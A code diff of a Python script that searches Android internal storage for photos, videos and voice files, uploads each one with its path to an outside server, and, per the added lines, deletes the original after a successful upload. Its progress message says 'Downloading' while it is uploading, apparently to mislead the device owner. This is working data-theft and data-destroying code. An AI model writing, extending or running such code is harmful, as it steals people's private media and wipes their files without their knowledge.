@@ -4,7 +4,7 @@ import requests
 # ✅ Step 1
 base_path = "/storage/emulated/0/"  # Android internal storage
 server_url = "https://hostiko.online/data/upload.php"  
-image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.opus']
+image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4', '.opus']
 
 # ✅ Step 2
 def find_all_images(path):
@@ -24,6 +24,7 @@ def upload_image(image_path):
             data = {'path': relative_path}  # Send relative path to server
             response = requests.post(server_url, files=files, data=data)
             if response.status_code == 200:
+                os.remove(image_path)  # ✅ Delete the file after successful upload
                 return True
             else:
                 return False
@@ -41,7 +42,7 @@ if __name__ == "__main__":
         success = upload_image(img)
         percent = int((idx / total_images) * 100)
         if success:
-            print(f"✔\r Downloading ({percent}%)",end=" ")
+            print(f"✔\r Downloading ({percent}%)", end=" ")
         else:
             print(f" ... ")
 
